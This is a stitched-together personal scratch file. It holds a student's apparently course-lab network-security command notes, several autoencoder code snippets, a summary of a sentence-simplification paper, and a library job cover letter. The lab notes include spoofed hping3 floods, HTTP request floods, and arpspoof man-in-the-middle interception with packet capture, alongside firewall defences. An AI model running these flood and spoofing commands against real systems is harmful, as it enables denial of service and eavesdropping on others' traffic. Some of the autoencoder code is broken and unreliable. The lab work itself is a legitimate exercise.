

sudo ufw enable

sudo hping3 -1 --flood -a 133.228.98.1 133.228.98.3

sudo nano /etc/ufw/before.rules

-A ufw-before-input -p icmp --icmp-type echo-request -s 133.228.98.1 -j DROP

sudo ufw reload

sudo ufw status

-A ufw-before-input -s 133.228.81.0/24 -p icmp -j ACCEPT

-A ufw-before-input -s 133.228.80.0/24 -p icmp -j DROP

sudo hping3 -1 --flood -a 133.228.98.1 133.228.98.3

sudo hping3 -1 --flood -a 133.228.99.2 133.228.98.3

sudo cat /var/log/ufw.log

sudo sysctl net.ipv4.icmp_echo_ignore_all=0

sudo sysctl -p

sudo ufw insert 1 deny from 133.228.98.1 to any port 2734 proto udp

sudo tcpdump -i ens192 udp port 2734 and src 133.228.98.1 -w udpprevent.pcap

sudo hping3 -u --flood -p 2734 133.228.98.3

sudo ufw delete 1

sudo ufw insert 1 reject from 133.228.98.1 to any port 2734 proto udp

sudo ufw allow ssh

while true; do wget http://133.228.98.3; sleep 6; done

while true; do wget http://133.228.98.3; sleep 4; done

sudo tcpdump -nn -r slow.pcap tcp | wc -l 

sudo iptables -A INPUT -i eth1 -s 133.228.98.3 -p tcp --tcp-flags SYN,ACK,FIN,RST SYN,ACK -j DROP

netstat -nat | grep :80 | grep SYN_RECV

netstat -nat | grep :80 | grep SYN_RECV | wc -l

sudo iptables -D INPUT -i eth1 -s 133.228.98.3 -p tcp --tcp-flags SYN,ACK,FIN,RST SYN,ACK -j DROP

sudo chmod +x script.sh

./script.sh

sudo tcpdump -i ens192 tcp port 80 and src 133.228.98.1 -w tcpsyn.pcap

netstat -nat | grep :80| grep ESTABLISHED| wc -l

N=500


URL="http://133.228.98.3/var/www/html/umbc.png"


for (( i=1; i<=$N; i++ )); do
  curl -s -o /dev/null $URL &
done


wait



------------------------

sudo ufw disable
Challenges: firewall was enabled

nc 133.228.98.3 22222
nc -l 22222

nc 133.228.81.3 22222

sudo arpspoof -i eth1 -t 133.228.98.2 -r 133.228.98.3  
sudo sysctl -w net.ipv4.ip_forward=1

sudo arpspoof -i eth1 -t 133.228.81.2 -r 133.228.81.3

sudo tcpdump -i eth1 -n -w arp.pcap 'host 133.228.98.2 and host 133.228.98.3 and tcp and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2))!=0)'

sudo tcpdump -i eth1 -n -w arp.pcap 'host 133.228.81.2 and host 133.228.81.3 and tcp and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)
>>2))!=0)'

tcpdump -nn -A -r arp.pcap tcp
cat arp.pcap
tshark -r arp.pcap -x
 sudo tcpdump -nn -r arp.pcap tcp

ssh Faisal@130.85.121.106
ssh -D 0.0.0.0:22222 -f -q -N Faisal@130.85.121.106

ssh -o ProxyCommand='nc -x 127.0.0.1:22222 %h %p' crsuser@133.228.98.1

sudo a2enmod ssl
sudo systemctl restart apache2

sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/ssl/private/apache-selfsigned.key -out /etc/ssl/certs/apache-selfsigned.crt

sudo nano /etc/apache2/sites-available/VB02734.csee.umbc.local.conf

sudo mkdir /var/www/VB02734.csee.umbc.local

sudo nano /var/www/VB02734.csee.umbc.local/index_sock.html

//sudo nano /etc/apache2/sites-available/default-ssl.conf


sudo mkdir /var/www/html/private

sudo nano /var/www/html/private/team.html

sudo a2ensite VB02734.csee.umbc.local.conf

sudo apache2ctl configtest //testing if it is running without errors

sudo systemctl reload apache2 //reload apache for the changes

TLS certificate:
sudo cp /etc/ssl/certs/apache-selfsigned.crt /etc/ssl/certs/
sudo cp /etc/ssl/private/apache-selfsigned.key /etc/ssl/private/


sudo mkdir /var/www/passwords
sudo touch /var/www/passwords

sudo htpasswd -c /var/www/passwords/password.file user1
Password: user1

sudo htpasswd -c /var/www/passwords/password.file user2
Password:user2

// Didnt do this
sudo chown www-data:www-data /var/www/passwords/password.file

//

sudo nano /var/www/html/private/pass.htaccess

<Directory /var/www/html/private>
       Options Indexes FollowSymLinks MultiViews
       AllowOverride All
       Order allow,deny
       allow from all
       Require all granted
   </Directory>
adding the above to sudo nano /etc/apache2/sites-available/VB02734.csee.umbc.local.conf

sudo systemctl restart apache2

notepad C:\Windows\System32\drivers\etc\hosts
// challenges notepad permissions required, restarting apache after modifying

sudo nano /var/www/html/hello.html



sudo tcpdump -i eth1 -n -w tcpdump_http.pcap 'host 133.228.98.2 and host 133.228.98.3 and tcp and (((
ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2))!=0)'








---------------------



'''
    ins = [num_input_dims]
    outs = [num_hidden_dims]
    num_neurons=[256,128]

    for x in num_neurons:
      ins.append(x)
      outs.append(x)
      print(ins)
      print(outs)
    outs.reverse()
    self.layers = nn.ModuleList([nn.Linear(in_features=i,
                                           out_features=o,
                                           bias=True) for i,o in zip(ins, outs)])
    self.fns = nn.ModuleList([act_fn() for i in range(len(num_neurons))])
    self.fns.append(nn.Softmax())
    self.encoder = nn.Sequential(*self.layers,*self.fns,)# to unpack the layers

    self.decoder_layers = nn.ModuleList([nn.Linear(in_features=o,
                                                        out_features=i,
                                                        bias=True) for i,o in zip(ins, outs)])
    self.decoder_layers.reverse()#reversing to get corrrect dimension reduction decoding
    self.decoder = nn.Sequential(*self.decoder_layers)
'''
	#self.encoder_layers = nn.ModuleList([nn.Linear(in_features=i, out_features=o, bias=True) for i, o in zip(ins, outs)])
    #self.decoder_layers = nn.ModuleList([nn.Linear(in_features=o, out_features=i, bias=True) for i, o in zip(ins, outs)])

    #self.encoder = nn.Sequential(*self.encoder_layers)
    #self.decoder = nn.Sequential(*self.decoder_layers)
#'''
    self.encoder = nn.Sequential(
            nn.Linear(784, 256),
            nn.ReLU(True),
            nn.Linear(256, 128),
            nn.ReLU(True),
            nn.Linear(128, 64),
        )
    self.decoder = nn.Sequential(
            nn.Linear(64, 128),
            nn.ReLU(True),
            nn.Linear(128, 256),
            nn.ReLU(True),
            nn.Linear(256, 784),
            nn.Sigmoid()
        )
#'''



#=========================================================================
# pytorch-autoencoder.py
#=========================================================================

import os

import torch
from torch                import nn
from torch.utils.data     import DataLoader
from torchvision          import transforms
from torchvision.datasets import MNIST
from torchvision.utils    import save_image

#-------------------------------------------------------------------------
# Prepare Dataset
#-------------------------------------------------------------------------

dataset = MNIST( './data', download=True, transform=transforms.ToTensor() )
dataloader = DataLoader( dataset, batch_size=128, shuffle=True )

#-------------------------------------------------------------------------
# Autoencoder Class
#-------------------------------------------------------------------------

class Autoencoder(nn.Module):

  def __init__(self):
    super(Autoencoder, self).__init__()

    self.encoder = nn.Sequential \
    (
      nn.Linear( 28*28, 256 ),
      nn.ReLU(True),
      nn.Linear( 256, 64 ),
      nn.ReLU(True)
    )

    self.decoder = nn.Sequential \
    (
      nn.Linear( 64, 256 ),
      nn.ReLU(True),
      nn.Linear( 256, 28*28 ),
      nn.Sigmoid()
    )

  def forward(self, x):
    x = self.encoder(x)
    x = self.decoder(x)
    return x

#-------------------------------------------------------------------------
# main
#-------------------------------------------------------------------------

model = Autoencoder().cpu()
print(model)

optimizer = torch.optim.Adam( model.parameters(), lr=0.001 )
criterion = nn.MSELoss()

for epoch in range(10):

  # Each iteration will process a batch of 128 images. There are a total
  # of 60K images, so there will be 468 iterations of this loop.

  for x, y in dataloader:

    # Reshape the 128x1x28x28 4D tensor to a 128x784 tensor

    x = x.view( x.size(0), -1 )

    # Forward pass

    out  = model(x)
    loss = criterion(out, x)

    # Backward pass

    optimizer.zero_grad()
    loss.backward()
    optimizer.step()

  # Display loss

  print( "epoch {}, loss:{:.4f}".format( epoch+1, loss ) )

  # Save input/output images

  if not os.path.exists('./imgs'):
    os.mkdir('./imgs')

  x = x.view( x.size(0), 1, 28, 28 )
  save_image( x, './imgs/x_{}.png'.format(epoch) )

  out = out.view( out.size(0), 1, 28, 28 )
  save_image( out, './imgs/out_{}.png'.format(epoch) )

















from keras.layers import Input, Dense
from keras.models import Model

# input placeholder
input_img = Input(shape=(784,))

# encoder architecture
encoded = Dense(128, activation='relu')(input_img)
encoded = Dense(64, activation='relu')(encoded)
encoded = Dense(32, activation='relu')(encoded)

# decoder architecture
decoded = Dense(64, activation='relu')(encoded)
decoded = Dense(128, activation='relu')(decoded)
decoded = Dense(784, activation='sigmoid')(decoded)

# autoencoder model
autoencoder = Model(input_img, decoded)

# compile autoencoder
autoencoder.compile(optimizer='adam', loss='binary_crossentropy')

# training the autoencoder
autoencoder.fit(x_train, x_train,
                epochs=50,
                batch_size=256,
                shuffle=True,
                validation_data=(x_test, x_test))

# encode and decode some test images
encoded_imgs = encoder.predict(x_test)
decoded_imgs = decoder.predict(encoded_imgs)













------------------------


class Autoencoder(nn.Module):
    def __init__(self, num_input_dims, num_hidden_dims,
                 act_fn=nn.Sigmoid()):
        super(Autoencoder, self).__init__()

        ins = [num_input_dims]
        outs = [num_hidden_dims]
        num_neurons=[512,256,128]

        for x in num_neurons:
          ins.append(x)
          outs.append(x)
          print(ins)
          print(outs)
          #outs.reverse()
          outs.sort()
          outs.reverse()
          print(outs)
        self.layers = nn.ModuleList([nn.Linear(in_features=i,
                                           out_features=o,
                                           bias=True) for i,o in zip(ins, outs)])
        self.fns = nn.ModuleList([act_fn() for i in range(len(num_neurons))])
        self.fns.append(nn.Softmax())
        self.encoder=self.layers
        #self.encoder = nn.Sequential(*self.layers,*self.fns,)# to unpack the layers

        self.decoder_layers = nn.ModuleList([nn.Linear(in_features=o,
                                                        out_features=i,
                                                        bias=True) for i,o in zip(ins, outs)])
        #self.decoder_layers.reverse()#reversing to get corrrect dimension reduction decoding
        #self.decoder = nn.Sequential(*self.decoder_layers)
        

    def forward(self, x):
        #batch_size = x.size(0)
        #x = x.view(batch_size, -1)
        x = self.encoder(x)
        z = x
        h = None
        for layer, fn in zip(self.layers, self.fns):
          h = layer(z)
          z = fn(h)
          probs = z
          logits = h
        x=logits
        #return logits, probs
        x = self.decoder(x)
        z = x
    #print(input_x.shape,"input_x_forward")#[50,784]
        h = None
        for layer, fn in zip(self.layers, self.fns):
          h = layer(z)
          z = fn(h)
          probs = z
          logits = h
        #return logits, probs
        x=logits
        return x


autoencoder = Autoencoder(num_input_dims=784, num_hidden_dims=64)
autoencoder_adjuster = torch.optim.Adam(autoencoder.parameters())
train(autoencoder, train_fts, train_fts,
      loss_fn=nn.BCELoss(),
      weight_adjuster=autoencoder_adjuster,
      num_epochs=20, batch_size=100)


The paper (Zhang and Lapata 2017) Sentence Simplification with Deep Reinforcement Learning implements the Sentence Simplification using Reinforcement Learning. The main priority of this approach for Sentence Simplification is to reduce sentence complexity as much as possible to simple sentence by maintaining certain constraints: simplifying the sentence, preserve the meaning and grammatically correct. The authors have done the task of reducing the complex sentences to simpler sentences with the help of the model defined by them which is termed as Deep Reinforcement Sentence Simplification (DRESS). The approach, first implementation, Neural Encoder-Decoder(EncDecA) with the help of Recurrent Neural Networks. It uses Generative Probabilistic model. The Encoder-Decoder Model also uses Long Short-Term Memory (LSTM; Hochreiter and Schmidhuber 1997) for both Encoder and Decoder. The Encoder-Decoder Model is incorporated with Reinforcement Learning to improve the task further with the help of rewards. The rewards which the reinforcement agent concentrates are Simplicity (which applies rewrite operations i.e. make changes for the sentence), Relevance (meaning of the target sentence is preserved),Fluency. The goal of Reinforcement Algorithm is to maximize the expected rewards. Further extending the DRESS model with Lexical Simplification (DRESS-LS) which substitutes complex words with simpler alternatives. 
The Markov Decision Process (MDP) components of DRESS formulation are: 	
MDP: (States,Actions,Rewards,π,γ)
States: Source X which consists of complex sentences which needs to be simplified
Actions: performing rewrite operations such as copying, deletion, substitution and word ordering for complex 
Rewards: The rewards in sentence simplification are Simplicity, Relevance, Fluency
π: The distribution in sentence simplification is given by policy, it generates the distribution over the actions when the states are given. The transition of distribution to new state is done based on the Rewards.
γ: γ (discount factor) is set to 1 as it emphasis more on the future rewards
The loss function used in Neural Encoder-Decoder is minimizing the negative log-likelihood which is cross entropy loss, where as in DRESS the loss function has the cross entropy loss with the reward function I.e. expected reward from agent.
Datasets used are Newsela(Xu et al. (2015b)), WikiSmall (Zhu et al., 2010), WikiLarge. Comparison systems used are hybrid (Narayan and Gardent (2014)), PBMT-R (Narayan and Gardent, 2014), Reference. Evaluation of the model on metrics such as SARI (Xu et al., 2016), BLEU (Papineni et al., 2002), Flesch-Kincaid Grade Level index (FKGL; Kincaid et al. 1975). FKGL measures readability of output, lower the better. BLEU assess the degree to which generated simplifications differed from gold standard reference. SARI evaluates the quality of the output by comparing it against the source and reference simplifications. BLEU, SARI higher the better. 
DRESS scores lower than EncDecA system in FKGL which means the DRESS is learning the reward and is better than the EncDecA for Newsela data. DRESS-LS performs the best for BLEU and slightly worse for FKGL and SAR for Newsela. For WikiSmall, DRESS performs the best for FKGL and Hybrid performs best for BLEU, SARI. For WikiLarge, EncDecA performs the best for BLEU.
Human evaluation ratings are given based on Fluency, Adequecy, Simplicity and All(combined ratings) for all the datasets and systems(not all) mentioned above. DRESS-LS has highest rating for Fluency and All on all data sets including best for simplicity on WikiSmall dataset. PBMT-R scores highest for all datasets. DRESS scores best for Simplicity for Newsela. DRESS and DRESS-LS are the best on Simplicity which was the main task of Sentence Simplification. Overall DRESS-LS performs better than other systems except DRESS which is almost similar.
The model conclusions based on rewrite operations which is done by Translation Error Rate(TER). Reinforcement Learning encourages to do more deletions. The task of the sentence to be simplified, Relevance and Fluency were there. Although, Reinforcement Models performed best at simplicity, it also performed best when combined all and it achieved the target of the Sentence Simplification.




They then incorporated reinforcement learning by providing rewards to the agent, which improved its ability to reduce sentence complexity while preserving meaning and grammatical correctness.






Dear Hiring Manager,

I am writing to express my interest in the Library Student Assistant position, as advertised on your website. With my experience in computer science and my prior work experience in customer service, I believe that I am a suitable candidate for this role.

As you can see from my attached resume, I am currently pursuing an MS in Computer Science at the University of Maryland, Baltimore County, and have completed my B.Tech. in Computer Science and Engineering from G. Pulla Reddy Engineering College. I have also gained 1.5 years of professional experience as a Software Developer and Programmer Analyst at Cognizant, where I developed technical skills and experience in managing projects, communicating with team members, and working on complex projects with minimal supervision.

Furthermore, my experience in customer service and working with students during my time at UMBC makes me well-equipped to provide support to patrons accessing library resources and answer basic circulation questions in person and by phone. Additionally, I have experience in software and database management, which can be useful in handling library resources and collections.

I am confident that my skills and experience make me a strong candidate for the Library Student Assistant position. I am punctual, have excellent communication skills, and have experience working effectively with the public in a calm and courteous manner. I am also able to perform complex tasks with minimal supervision, have experience with handling heavy books, and can lift up to 25lbs. as required by the position.

Thank you for considering my application. I look forward to the opportunity to discuss my qualifications further.

Sincerely,

Faisal Rasheed Khan


The autoencoder was trained to reduce the dimensionality of the input from its original size of 784 to a lower dimensionality of 64. The autoencoder was then trained on the reconstructed dimensionality of 784 features from the lower dimensionality of 64 features.
